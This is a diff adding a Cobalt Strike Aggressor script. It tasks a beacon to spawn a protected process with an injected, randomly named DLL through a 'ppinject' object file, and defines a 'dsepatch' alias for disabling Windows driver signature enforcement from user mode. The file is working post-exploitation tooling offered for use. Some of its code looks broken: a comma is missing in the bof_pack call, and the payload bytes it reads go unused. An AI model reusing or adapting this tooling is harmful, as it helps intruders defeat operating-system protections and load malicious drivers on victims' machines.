@@ -1,0 +1,50 @@
+##
+## Spawns a protected process with the specified 
+## DLL injected. Leverages inject
+##
+sub ppspawn_dll {
+	$arch = barch( $1 );
+	$dlln = random_string( "12" ) . ".dll";
+	$lnkn = random_string( "12" ) . ".dll";
+
+	if ( !-exists script_resource( "inject/ppinject." . $arch . ".o" ) ) {
+		berror( $1, "could not find ppinject object file on disk." );
+		return;
+	};
+
+	btask( $1, "Tasking beacon to spawn a protected process and load " . $2 . " as " . $dlln );
+
+	$boff = openf( script_resource( "inject/ppinject." . $arch . ".o" ) );
+	$bofb = readb( $boff, -1 );
+	closef( $boff );
+
+	$payf = openf( script_resource( $2 ) );
+	$payb = readb( $payf, -1 );
+	closef( $payf );
+
+	$args = bof_pack( $1 "ZZZ", $dlln, $lnkn, "services.exe" );
+	beacon_inline_execute( $1, $bofb, "SpawnProtectedProcessWithLibrary", $args );
+}
+
+##
+## Patches driver signing enforcement from
+## usermode.
+##
+alias dsepatch {
+	ppspawn_dll( $1, "image.dll" );
+};
+
+##
+## Creates a random string.
+##
+sub random_string {
+	$limit = $1;
+	@random_str = @();
+	$characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+
+	for ($x = 0; $x < $limit; $x++) {
+		$n = rand(strlen($characters));
+		add(@random_str, charAt($characters, $n));
+	}
+	return join('', @random_str);
+}
